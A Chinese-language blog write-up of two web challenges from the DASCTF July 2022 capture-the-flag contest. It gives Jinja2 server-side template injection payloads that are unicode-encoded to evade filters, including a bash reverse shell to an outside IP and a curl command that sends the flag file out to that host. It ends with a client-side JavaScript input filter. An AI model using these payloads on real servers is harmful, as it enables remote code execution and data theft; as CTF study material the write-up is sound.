---
title: DASCTF 7月赛
tags:
  - web
abbrlink: c1a72657
date: 2022-07-24 22:25:19
---

谢谢出题人，SSTI🦈我，签到就不说了，直接看后面两个

## Harddisk

SSTI，就是过滤很过分，甚至还滤了g和x这两个单字符，还过滤了`{{}}`和print，注定是没有回显了，要反弹shell了，先试试构造最简单的~~（别说为啥不用别的，都被ban了我怎么用😭）~~ `lipsum.__globals__['os'].popen('sh -i >& /dev/tcp/182.61.46.138/10000 0>&1').read()`

```
{%set a="__globals__"%}
{%set d="os"%}
{%set e="popen"%}
{%set c="bash -i >& /dev/tcp/182.61.46.138/10000 0>&1"%}
{%set f="get"%}
{%set b=((lipsum|attr(a))|attr("get")(d))|attr(e)(c) %}
```

走一波unicode编码还有空格绕过，就变成了这样

```
{%25set%09a="\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"%25}
{%25set%09d="\u006f\u0073"%25}
{%25set%09e="\u0070\u006f\u0070\u0065\u006e"%25}
{%25set%09c="\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0038\u0032\u002e\u0036\u0031\u002e\u0034\u0036\u002e\u0031\u0033\u0038\u002f\u0031\u0030\u0030\u0030\u0030\u0020\u0030\u003e\u0026\u0031"%25}
{%25set%09f="\u0067\u0065\u0074"%25}
{%25set%09b=((lipsum|attr(a))|attr(f)(d))|attr(e)(c)%25}
```

执行出错了，估计是没导os模块，走import的路子吧（不知道为啥shell反弹不过来，就用学长给的curl外带吧

```
{%set a="__globals__"%}
{%set b="__builtins__"%}
{%set cmd="__import__("os").system("curl 182.61.46.138?`cat /f*`")"%}
{%set c=(lipsum|attr(a))|attr("get")(b)|attr("get")("eval")(cmd)%}
```

同上换一下格式

```
{%25set%09a="\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"%25}
{%25set%09b="\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f"%25}
{%25set%09cmd="\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0022\u006f\u0073\u0022\u0029\u002e\u0073\u0079\u0073\u0074\u0065\u006d\u0028\u0022\u0063\u0075\u0072\u006c\u0020\u0031\u0038\u0032\u002e\u0036\u0031\u002e\u0034\u0036\u002e\u0031\u0033\u0038\u003f\u0060\u0063\u0061\u0074\u0020\u002f\u0066\u002a\u0060\u0022\u0029"%25}
{%25set%09c=(lipsum|attr(a))|attr("\u0067\u0065\u0074")(b)|attr("\u0067\u0065\u0074")("\u0065\u0076\u0061\u006c")(cmd)%25}
```

![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207242303093.png)

## 绝对防御

呜呜呜我是笨比，找到了文件都没想着直接打开一下😭

扫不出东西就看看JS吧，其中一个文件的API带了php文件`ImLib.API_PATH = "/SUPPERAPI.php";`，看一下，有源码

```javascript
<script>

function getQueryVariable(variable)
{
       var query = window.location.search.substring(1);
       var vars = query.split("&");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split("=");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}

function check(){
		var reg = /[`~!@#$%^&*()_+<>?:"{},.\/;'[\]]/im;
        if (reg.test(getQueryVariable("id"))) {
            alert("提示：您输入的信息含有非法字符！");
            window.location.href = "/"
         }
}
check()
</script>
```



























